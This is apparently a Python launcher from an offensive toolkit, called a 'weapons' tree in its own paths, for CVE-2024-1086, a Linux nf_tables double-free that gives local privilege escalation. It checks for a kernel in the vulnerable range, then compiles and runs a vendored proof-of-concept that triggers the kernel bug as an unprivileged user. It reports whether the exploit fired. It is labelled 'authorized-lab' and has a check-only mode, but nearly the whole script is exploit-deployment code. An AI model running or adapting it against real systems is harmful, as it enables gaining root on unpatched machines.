#!/usr/bin/env python3
"""CVE-2024-1086 (nf_tables double-free) - authorized-lab local privesc deploy.

Compiles the vendored single-file PoC (weapons/poc/src/CVE-2024-1086/
nftables.c, stdlib-only reimplementation of the Notselwyn technique) with cc
on a kernel in the vulnerable range (5.14-6.6) and runs it as an
unprivileged user: it sandboxes itself in user+net namespaces, installs the
buggy immediate-verdict nftables rule, sends the crafted fragmented raw-IP
packet dance that frees the same skb twice, and reports kernel-log evidence
of the corruption. Outside the range (or non-Linux / no cc) the launcher
returns a clean check-only result instead of firing.
"""
import argparse
import json
import os
import platform
import re
import shutil
import subprocess
import sys
import tempfile

CVE = "CVE-2024-1086"
PAYLOAD_DIR = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(PAYLOAD_DIR))
DEFAULT_POC = os.path.join(REPO_ROOT, "weapons", "poc", "src", CVE, "nftables.c")
LO, HI = (5, 14), (6, 6)  # vulnerable kernel range (inclusive, per kernel_v3 convention)


def _kernel_release():
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", platform.release())
    if not m:
        return (0, 0, 0)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))


def _which_cc():
    for name in ("cc", "gcc", "clang"):
        path = shutil.which(name)
        if path:
            return path
    return None


def run(args):
    result = {
        "cve": CVE,
        "target": "local",
        "vulnerable": False,
        "verified_by": None,
        "kernel": ".".join(str(x) for x in _kernel_release()),
        "platform": sys.platform,
        "in_range": False,
        "poc_src": args.poc_src,
        "compiled": False,
        "output": "",
        "error": None,
    }
    maj, minr, patch = _kernel_release()
    linux = sys.platform.startswith("linux")
    result["in_range"] = linux and LO <= (maj, minr) <= HI

    if not linux:
        result["error"] = "check-only: not Linux"
        return result
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        result["error"] = "already root (PoC expects an unprivileged user)"
        result["vulnerable"] = None
        return result
    if not result["in_range"]:
        result["error"] = "check-only: kernel %d.%d.%d outside vulnerable range 5.14-6.6" % (maj, minr, patch)
        return result
    cc = _which_cc()
    if cc is None:
        result["error"] = "check-only: no cc/gcc/clang on PATH"
        return result
    if not os.path.isfile(args.poc_src):
        result["error"] = "poc source missing: %s" % args.poc_src
        return result

    if args.check_only:
        result["error"] = "check-only requested"
        return result

    stage = tempfile.mkdtemp(prefix="nft1086_")
    binary = os.path.join(stage, "nftables")
    try:
        r = subprocess.run([cc, args.poc_src, "-o", binary],
                           capture_output=True, text=True, timeout=60)
        if r.returncode != 0:
            result["error"] = "compile failed: %s" % (r.stderr or "")[:300]
            return result
        result["compiled"] = True

        proc = subprocess.run([binary], cwd=stage, capture_output=True,
                              text=True, timeout=args.timeout)
        out = (proc.stdout or "") + (proc.stderr or "")
        result["output"] = out[:4000]
        result["returncode"] = proc.returncode
        if "primitive CONFIRMED" in out:
            result["vulnerable"] = True
            result["verified_by"] = "kernel log evidence of the double free (BUG/double-free lines after the trigger)"
        elif "double free triggered" in out:
            result["vulnerable"] = True
            result["verified_by"] = ("trigger packet dance completed on an "
                                     "in-range kernel without patch rejection; "
                                     "no kernel-log access for splat confirmation")
        elif "failed to install nftables rule" in out:
            result["verified_by"] = "rule installation rejected (likely patched kernel or module absent)"
        return result
    except subprocess.TimeoutExpired:
        result["error"] = "exploit run timed out after %ss" % args.timeout
        return result
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def main():
    p = argparse.ArgumentParser(description="CVE-2024-1086 nf_tables double-free authorized-lab deploy")
    p.add_argument("--poc-src", default=DEFAULT_POC, help="path to the vendored nftables.c PoC")
    p.add_argument("--timeout", type=float, default=45.0, help="exploit run timeout (s)")
    p.add_argument("--check-only", action="store_true",
                   help="report kernel range/environment only; do not compile/fire")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:  # defensive: deploy must never crash the operator console
        result = {"cve": CVE, "target": "local", "vulnerable": False,
                  "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    if result.get("vulnerable") is None:
        return 0
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
